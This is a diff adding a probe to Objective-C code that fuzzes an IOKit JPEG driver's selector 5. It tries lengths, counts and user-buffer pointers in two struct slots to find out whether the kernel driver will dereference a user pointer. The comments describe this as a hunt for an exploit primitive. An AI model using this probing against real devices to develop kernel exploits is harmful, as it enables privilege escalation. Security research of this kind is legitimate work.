@@ -973,6 +973,58 @@ NSString *ModJpegMethods(void) {
         rs_jm_drain(notify, @"fieldmap end");
     }
 
+    // ---- sel5 VALUE PROBE: exactly two slots are validated (+0x58, +0x78).
+    //      Find what they accept: a length, an index, a count - or a POINTER.
+    //      A user pointer that the driver dereferences is a direct primitive,
+    //      so the last candidates point at a user buffer we filled with a
+    //      known pattern and then check whether the driver changed it. ----
+    {
+        const uint32_t SLOT = 8, BASE = (uint32_t)sizeof(RSJpegIn);
+        uint8_t *ubuf = (uint8_t *)malloc(0x1000);
+        if (ubuf) memset(ubuf, 0x41, 0x1000);
+        uint64_t uaddr = ubuf ? (uint64_t)(uintptr_t)ubuf : 0;
+        AveLog(S(@"[jpegmethods] value probe: pattern buffer at %#llx (filled 0x41)", uaddr));
+
+        for (int si = 0; si < 2; si++) {
+            uint32_t slot = (si == 0) ? BASE : (BASE + 0x20);   // +0x58, +0x78
+            uint64_t vals[40];
+            int nv = 0;
+            vals[nv++] = 0;
+            for (uint64_t v = 1; v <= 0x10000000 && nv < 28; v <<= 1) vals[nv++] = v;
+            vals[nv++] = (uint64_t)W * H;
+            vals[nv++] = (uint64_t)W * H * 4;
+            vals[nv++] = 0x0000000100000000ull;
+            if (uaddr) { vals[nv++] = uaddr; vals[nv++] = uaddr + 0x800; }
+            AveLog(S(@"[jpegmethods] value probe slot +%04x: %d candidates", slot, nv));
+            for (int i = 0; i < nv; i++) {
+                uint8_t *big = (uint8_t *)malloc(0x1000);
+                uint8_t *bigo = (uint8_t *)malloc(0x1000);
+                if (!big || !bigo) { free(big); free(bigo); break; }
+                memset(big, 0, 0x1000);
+                memset(bigo, 0, 0x1000);
+                rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
+                memcpy(big + slot, &vals[i], 8);
+                size_t os = 0x1000;
+                kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
+                AveLog(S(@"[jpegmethods]   +%04x = %#018llx -> kr=%#x", slot, vals[i], kr));
+                free(big);
+                free(bigo);
+                if (kr == KERN_SUCCESS && uaddr) {
+                    // the field was accepted: did the driver touch our buffer?
+                    int changed = 0;
+                    for (uint32_t k = 0; k < 0x1000; k++)
+                        if (ubuf[k] != 0x41) { changed = 1; break; }
+                    if (changed) {
+                        AveLog(S(@"[jpegmethods]   *** DRIVER WROTE INTO OUR USER BUFFER (+%04x = %#llx) ***",
+                                 slot, vals[i]));
+                        rs_jm_dump(@"userbuf", ubuf, 0x1000);
+                    }
+                }
+            }
+        }
+        free(ubuf);
+    }
+
     IOServiceClose(conn);
     CFRelease(src); CFRelease(dst); CFRelease(encSrc); CFRelease(encDst);
     IOObjectRelease(svc);
